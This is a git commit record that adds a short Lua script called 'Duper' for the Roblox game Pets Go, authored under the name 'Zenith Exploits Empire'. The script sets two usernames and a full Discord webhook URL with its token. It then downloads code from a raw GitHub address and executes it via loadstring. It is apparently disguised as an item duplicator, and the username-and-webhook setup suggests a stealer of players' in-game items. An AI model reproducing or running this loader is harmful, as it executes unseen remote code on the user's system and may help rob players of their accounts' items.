b90607a54251b0d61c673ad7aaf651e9957b64dd
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-21 10:13:10 +0200

    Added petsgo script: Duper

---
+++ pets go/Duper.lua
@@ -0,0 +1,5 @@
+Username = "Smurffgocrazylz"
+Username2 = "Smurffgocrazylz"
+Webhook = "https://discord.com/api/webhooks/1362002575632896040/fa8VB1WCkmdRiOZAjwtZI2yrdWrtWIVLLoEiQyAtp3feq4YRnwT_uGWC6j3utISUOqjz"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
